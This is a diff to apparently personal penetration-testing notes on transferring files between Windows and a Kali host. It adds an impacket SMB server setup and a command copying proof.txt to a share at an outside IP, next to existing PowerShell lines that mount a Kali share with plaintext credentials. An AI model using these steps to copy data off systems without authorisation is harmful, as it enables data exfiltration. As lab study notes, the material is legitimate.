@@ -103,4 +103,11 @@ On windows:
 $pass = convertto-securestring '[PASSWORD ON KALI]' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('[USER ON KALI]', $pass)
 New-PSDrive -NAME [USER] -PSProvider FileSystem -Credential $cred -Root \\[KALI IP]\[SHARE NAME]
+
+--------Windows to Linux----------
+Via SMB:
+on Linux : smbserver.py test ./share
+smbserver.py [share_name] [folder_path]
+on Windows: copy proof.txt \\192.168.119.160\test\proof.txt
+copy [file to transfer] \\[linux ip]\[share_name]\[output file name]
 ```
